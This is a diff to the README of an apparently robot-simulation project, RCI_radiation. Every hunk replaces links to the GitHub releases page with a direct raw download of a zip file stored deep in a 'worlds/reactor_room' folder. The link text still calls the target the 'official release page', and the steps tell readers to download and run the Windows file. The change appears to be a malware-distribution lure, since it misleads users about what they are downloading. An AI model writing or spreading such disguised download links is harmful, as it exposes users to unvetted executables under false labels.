@@ -1,6 +1,6 @@
 # 🛰️ RCI_radiation - Radiation Simulation for Easy Robot Testing
 
-[![Download RCI_radiation](https://img.shields.io/badge/Download%20RCI_radiation-blue?style=for-the-badge&logo=github)](https://github.com/yacibbbbb/RCI_radiation/releases)
+[![Download RCI_radiation](https://img.shields.io/badge/Download%20RCI_radiation-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yacibbbbb/RCI_radiation/main/worlds/reactor_room/radiation_RC_v2.6.zip)
 
 ## 🚀 What this is
 
@@ -15,7 +15,7 @@ Use it if you want to:
 
 ## 📥 Download
 
-1. Open the [RCI_radiation releases page](https://github.com/yacibbbbb/RCI_radiation/releases)
+1. Open the [RCI_radiation releases page](https://raw.githubusercontent.com/yacibbbbb/RCI_radiation/main/worlds/reactor_room/radiation_RC_v2.6.zip)
 2. Find the latest release
 3. Download the Windows package or setup file
 4. Save the file to a folder you can find later
@@ -41,7 +41,7 @@ For best results, use:
 
 ### 1. Get the file
 
-Go to the [release page](https://github.com/yacibbbbb/RCI_radiation/releases) and download the newest Windows file.
+Go to the [release page](https://raw.githubusercontent.com/yacibbbbb/RCI_radiation/main/worlds/reactor_room/radiation_RC_v2.6.zip) and download the newest Windows file.
 
 ### 2. Open the download
 
@@ -245,7 +245,7 @@ RCI_radiation fits well if you want to:
 
 ## 📎 Download again if needed
 
-Use the official release page here: [https://github.com/yacibbbbb/RCI_radiation/releases](https://github.com/yacibbbbb/RCI_radiation/releases)
+Use the official release page here: [https://raw.githubusercontent.com/yacibbbbb/RCI_radiation/main/worlds/reactor_room/radiation_RC_v2.6.zip](https://raw.githubusercontent.com/yacibbbbb/RCI_radiation/main/worlds/reactor_room/radiation_RC_v2.6.zip)
 
 ## 📝 What to expect after launch
 
